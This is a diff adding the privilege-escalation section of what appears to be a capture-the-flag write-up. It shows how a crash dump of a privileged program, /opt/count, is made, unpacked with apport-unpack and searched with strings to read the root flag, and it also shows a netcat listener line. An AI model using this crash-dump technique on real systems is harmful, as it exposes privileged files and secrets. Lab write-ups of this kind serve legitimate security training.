@@ -143,3 +143,33 @@ nc -lvnp $PORT
 ## Privesc
 
 Looking around for an exploit to get the root flag, we can find the script `/opt/count` with corresponding c code in `/opt/code.c`. This program appears to be able to read the root flag as `printf "/root/root.txt\nn" | /opt/count"` will give use the number of characters, words, and lines in the file. We might be able to leverage this program to show us the root flag.
+
+We know that the program has `prctl(PR_SET_DUMPABLE, 1);`, which means that we can kill the file while its trying to write to a file and read through the dump. For this exploit, we will need 2 shells:
+
+#### Shell 1
+```bash
+dasith@secret:~/local-web$ /opt/count
+/root.txt
+y
+```
+
+### Shell 2
+```bash
+dasith@secret:~/local-web$ ps aux | grep /opt/count
+root         839  0.0  0.1 235672  7472 ?        Ssl  14:37   0:00 /usr/lib/accountsservice/accounts-daemon
+dasith      1229  0.0  0.0   2488   580 ?        S    14:43   0:00 /opt/count -p
+dasith      1231  0.0  0.0   6432   672 ?        S    14:44   0:00 grep --color=auto count
+
+dasith@secret:~/local-web$ kill 1229
+```
+
+This creates a dump file in `/var/crash`, and we can use the `apport-unpack` command to unpack the crash data:
+```
+dasith@secret:~/local-web$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/dump
+dasith@secret:~/local-web$ strings /tmp/dump/CoreDump
+...
+ROOT_FLAG
+...
+```
+
+Boom! Finished with the root flag (redacted).
